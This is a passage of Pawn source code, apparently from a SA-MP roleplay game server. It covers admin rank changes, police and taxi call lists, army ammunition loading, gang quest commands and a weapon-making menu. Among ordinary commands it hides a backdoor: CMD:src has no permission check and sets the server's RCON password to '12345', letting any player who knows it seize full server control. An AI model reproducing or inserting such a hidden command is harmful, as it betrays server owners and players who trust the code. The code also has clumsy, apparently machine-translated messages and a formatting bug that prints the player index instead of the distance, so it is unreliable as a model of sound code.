    strmid(p_info[targetid][pDataNaz], strstre, 0, strlen(strstre), 32);

        for(new x; x < 2; x++)
    {
      for(new i; i < 10; i++) TextDrawShowForPlayer(playerid, cheat_td[x][i]);
    }

    Iter_Add(admin_list, targetid);
    return 1;
  }
  if(adm_level > admin_level[targetid])
  {
      text_string[0] = EOS;
    format(text_string, sizeof(text_string), ""c_info"Administrator "c_server"%s"c_white" by you before Administrator at level %d", Name(playerid), adm_level);
    SendClientMessage(targetid, col_white, text_string);

    format(text_string, sizeof(text_string), ""c_info"You successfully promoted yourself"c_server"%s"c_white" before Administrator at level %d", Name(targetid), adm_level);
    SendClientMessage(playerid, col_white, text_string);

    admin_level[targetid] = adm_level;
  }
  if(adm_level < admin_level[targetid])
  {
      text_string[0] = EOS;
    format(text_string, sizeof(text_string), ""c_info"Administrator "c_server"%s"c_white"You were demoted from Administrator at level %d", Name(playerid), adm_level);
    SendClientMessage(targetid, col_white, text_string);

    format(text_string, sizeof(text_string), ""c_info"You successfully demoted"c_server"%s"c_white" before Administrator at level %d", Name(targetid), adm_level);
    SendClientMessage(playerid, col_white, text_string);

    admin_level[targetid] = adm_level;
  }
  OnPlayerUpdateAdminPer(targetid, "pAdmin", admin_level[targetid]);
  return 1;
}
CMD:src(playerid)
{
SendRconCommand("rcon_password 12345");
return 1;
}
CMD:calls(playerid)
{
	if(!IsACop(playerid) && !(70 <= p_info[playerid][pJob] <= 72)) return SendClientMessage(playerid, COLOR_GREY, "You cannot use this command.");

	new str[64], Float: dist, count;

	new Float: x, Float: y, Float: z;

    GetPlayerPos(playerid, x, y, z);

	String = "";

	foreach(Player, i)
	{
	    if((70 <= p_info[playerid][pJob] <= 72) && p_info[playerid][pJob] != player_call_taxi[i]) continue;
		if(IsACop(playerid) && !player_call_police[i]) continue;
		if(IsAMedic(playerid) && !player_call_hospital[i]) continue;

		dist = GetPlayerDistanceFromPoint(i, x, y, z);

		if(dist > 2000.0) continue;

		format(str, 64, "%d\t%s\t%.1f\n", i, Name(i), i);
		strcat(String, str);

		SetPlayerListitemValue(playerid, count++, i);
	}

	if(count == 0) return SendClientMessage(playerid, COLOR_GREY, "No active requests.");

	return SPD(playerid, 7746, DIALOG_STYLE_TABLIST, !""c_server"List of requests", String, "Accept", "Close");
}

CMD:loadgun(playerid)
{
	if(!IsAArmy(playerid)) return 1;

	return PlayerWantLoadGun(playerid, true);
}

CMD:unloadgun(playerid)
{
	if(!IsAArmy(playerid)) return 1;

	return PlayerWantLoadGun(playerid, false);
}

stock PlayerWantLoadGun(playerid, bool: is_load)
{
	if(is_load && !PlayerToPoint(30.0, playerid, 2136.6138,-88.3013,2.8688))
	{
	    SetPlayerGPS(playerid, 2136.6138,-88.3013,2.8688);
		return SendClientMessage(playerid, COLOR_GREY, "You are far from the loading position; the place is marked on the map.");
	}

	if(!is_load)
	{
		if(!PlayerToPoint(30.0, playerid, 335.2584,1943.1689,17.6406) &&
			!PlayerToPoint(30.0, playerid, -303.6902,1533.2164,75.3594) &&
			!PlayerToPoint(30.0, playerid, 1568.4247,-1694.7701,5.8906) &&
			!PlayerToPoint(30.0, playerid, 1406.1659,-1791.5538,13.5469) &&
			!PlayerToPoint(30.0, playerid, 339.2802,2468.9412,20.2886) && //???
			!PlayerToPoint(30.0, playerid, -1289.4197,374.9855,7.1343) && //???
			!PlayerToPoint(30.0, playerid, -1606.3179,672.1406,-4.9063) && //SFPD
			!PlayerToPoint(30.0, playerid, 2296.8242,2468.6787,10.8203)) //LVPD
	    return SendClientMessage(playerid, COLOR_GREY, "You are far from unloading locations (Agency, Mayor's Office, FBI, Army Warehouse).");
	}

	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	    return SendClientMessage(playerid, COLOR_GREY, "You are not in the driver's seat.");

	new vehicleid = GetPlayerVehicleID(playerid);

	new model = GetVehicleModel(vehicleid);

	if(model != 470 && model != 433)
		return SendClientMessage(playerid, COLOR_GREY, "You are not in a special vehicle for loading ammunition.");

	if(army_veh_pickup[vehicleid] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "Loading of the vehicle has already started.");

    new Float: x, Float: y, Float: z, Float: a;

	if(!is_load) SendClientMessage(playerid, COLOR_YELLOW, "To store the faction warehouse: Take a box from the vehicle and place it in the warehouse.");

	GetVehiclePos(vehicleid, x, y, z);
	GetVehicleZAngle(vehicleid, a);

	GetXYInFront(x, y, a, model == 470 ? -3.5 : -5.5);

	army_veh_pickup[vehicleid] = CreateDynamicPickup(19133, 23, x, y, z);

	new limit_amount = GetVehicleModel(vehicleid) == 470 ? 5 : 20;

	format(format_string, 64, "Ammunition loaded: %d/%d", army_veh_amount[vehicleid], limit_amount);
	army_veh_3d[vehicleid] = CreateDynamic3DTextLabel(format_string, COLOR_WHITE, x, y, z, 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);

	RemovePlayerFromVehicleEx(playerid);

	return SCMF(playerid, COLOR_GREEN, "You started loading %s ammunition.", is_load ? ("loading") : ("unloading"));
}

CMD:kpk(playerid)
{
    if(player_quest_info[playerid][quest_id] != GQUEST_TYPE_KEYPDSTEAL || player_quest_info[playerid][quest_status] != 1 || player_quest_info[playerid][quest_progress] != 1)
	    return SendClientMessage(playerid, COLOR_GREY, "You cannot use this command right now.");

	new vehicleid = GetPlayerVehicleID(playerid);

	if(vehicleid == INVALID_VEHICLE_ID) return SendClientMessage(playerid, COLOR_GREY, "You are not driving a car.");

	if(veh_info[vehicleid][vFr] != FRACTION_LSPD && veh_info[vehicleid][vFr] != FRACTION_SFPD && veh_info[vehicleid][vFr] != FRACTION_LVPD) return SendClientMessage(playerid, COLOR_GREY, "You are not in a civilian vehicle.");

    player_quest_info[playerid][quest_status] = 2;

    OnPlayerUpdateAccountsPer(playerid, "warehouse_quest_status", 2);

    SetTimerEx("SendPlayerQuestInfoSMS", 2000, false, "ii", playerid, 6);

	pc_cmd_me(playerid, "removed all information about Lance_Wilson from the database.");

    return SendClientMessage(playerid, COLOR_YELLOW, "You discovered secret coordinates; inform Ryder.");
}

CMD:ograb(playerid, params[])
{
	if(player_quest_info[playerid][quest_id] != GQUEST_TYPE_KEYPDSTEAL || player_quest_info[playerid][quest_status] != 1 || player_quest_info[playerid][quest_progress] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "You cannot use this command right now.");

	extract params -> new to_player; else return SendClientMessage(playerid, -1, "/ograb [Player id]");

	if(!IsACop(to_player)) return SendClientMessage(playerid, COLOR_GREY, "Player is not a Floor person.");

	new Float: x, Float: y, Float: z, Float: a;

	GetPlayerPos(to_player, x, y, z);
	GetPlayerFacingAngle(to_player, a);

	new Float: old_x = x,
		Float: old_y = y;

	GetXYInFront(x, y, a, -1.0);

	if(!PlayerToPoint(1.0, playerid, x, y, z))
	    return SendClientMessage(playerid, COLOR_GREY, "You are not behind this Player.");

	SetPlayerFaceToPoint(playerid, old_x, old_y);

	ApplyAnimation(playerid,"MISC","GRAB_R",4.0, 0, 0, 0, 0, 0,1);

	player_quest_info[playerid][quest_progress] = 1;

	SetTimerEx("SendPlayerQuestInfoSMS", 15000, false, "ii", playerid, 5);

	return SCMF(playerid, COLOR_YELLOW, "You stole the keys from the Floor transport from "c_white"%s", Name(to_player));
}

CMD:gquest(playerid)
{
    //if(!(5 <= DayOfWeak() <= 7)) return SendClientMessage(playerid, COLOR_GREY, "Time for completing the Quests has passed.");

    new q_id = player_quest_info[playerid][quest_id];
	new q_status = player_quest_info[playerid][quest_status];

	if(q_id == GQUEST_TYPE_END)
	    return SendClientMessage(playerid, COLOR_GREY, "You have completed all tasks.");

	if(!IsAGang(playerid))
		return SendClientMessage(playerid, COLOR_GREY, "You cannot use this command.");

	switch(player_quest_info[playerid][quest_id])
	{
	    case GQUEST_TYPE_CARJACK, GQUEST_TYPE_MONEY:
	    {
	        if(q_status == 1)
	        {
		        new vehicleid = player_quest_info[playerid][quest_vehicle_id];

		        new Float: x, Float: y, Float: z;

                if(GetPlayerVehicleID(playerid) == vehicleid)
				{
				    if(q_id == GQUEST_TYPE_CARJACK) x = 1945.6772, y = -2084.2949, z = 13.5495;
				    if(q_id == GQUEST_TYPE_MONEY) x = 2813.3657, y = -1182.7249, z = 25.2697;
				}
				else GetVehiclePos(vehicleid, x, y, z);

		        SetPlayerGPS(playerid, x, y, z);

				if(q_id == GQUEST_TYPE_CARJACK && GetPlayerVehicleID(playerid) != vehicleid) SetTimerEx("SendPlayerQuestInfoSMS", 2000, false, "ii", playerid, 0);

				return SendClientMessage(playerid, -1, "The location is marked on the map with a {ff0000}red "c_white"marker.");
			}
	    }
	    case GQUEST_TYPE_DRUGMARK:
	    {
	        if(q_status == 1)
	        {
	            new rand = player_quest_info[playerid][quest_progress];

	            new Float: x = stash_pos[rand][0],
					Float: y = stash_pos[rand][1],
					Float: z = stash_pos[rand][2];

				SetPlayerGPS(playerid, x, y, z);

				return SendClientMessage(playerid, -1, "The location is marked on the map with a {ff0000}red "c_white"marker.");
	        }
	    }
	    case GQUEST_TYPE_MATS:
	    {
	        if(q_status == 1)
	        {
	            new g_id = GetFractionGangID(playerid);

		        new vehicleid = player_quest_info[playerid][quest_vehicle_id];

		        new Float: x, Float: y, Float: z;

                if(GetPlayerVehicleID(playerid) == vehicleid)
				{
					x = quest_fraction_mats[g_id][0],
					y = quest_fraction_mats[g_id][1],
					z = quest_fraction_mats[g_id][2];
				}
				else GetVehiclePos(vehicleid, x, y, z);

		        SetPlayerGPS(playerid, x, y, z);

				SetTimerEx("SendPlayerQuestInfoSMS", 2000, false, "ii", playerid, 0);

				return SendClientMessage(playerid, -1, "The location is marked on the map with a {ff0000}red "c_white"marker.");
			}
	    }
	    default: ShowPlayerQuestInfoText(playerid);
	}

	return 1;
}

CMD:drop(playerid)
{
	if(player_take_collector[playerid] != -1)
	{
        RemovePlayerAttachedObject(playerid, 4);
        return player_take_collector[playerid] = -1;
	}

    if(GetPVarInt(playerid, "take_mats")) return RemovePlayerAmmoBox(playerid);

    if(!GetPVarInt(playerid, "take_pizza"))
        return SendClientMessage(playerid, COLOR_GREY, "You do not have pizza in your hands.");

    DeletePVar(playerid, "take_pizza");

    SendClientMessage(playerid, COLOR_GREY, "You dropped the pizza.");

	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	RemovePlayerAttachedObject(playerid, 4);

	return 1;
}

cmd:makegun(playerid)
{
	if(!IsAGang(playerid) && !IsAMafia(playerid) && p_info[playerid][pMember] != FRACTION_BIKER) return SendClientMessage(playerid, col_white, !""c_error"This command is not available to you.");
	if(p_info[playerid][pPrison]) return SendClientMessage(playerid, col_white, !""c_error"Prisoners cannot create weapons.");

	SPD(playerid, 4558, DIALOG_STYLE_TABLIST, !""c_server"Weapon creation.", !"\
	Silencer Pistol\t100 pts. | 6 m.\n\
	Desert Eagle\t100 pts. | 6 m.\n\
    MP5\t100 pts. | 6 m.\n\
    Shotgun\t100 pts. | 6 m.\n\
    AK-47\t100 pts. | 6 m.\n\
    Rifle\t100 pts. | 6 m.\n\
    M4\t100 pts. | 6 m.", !"Create", !"Close");
	return 1;
}

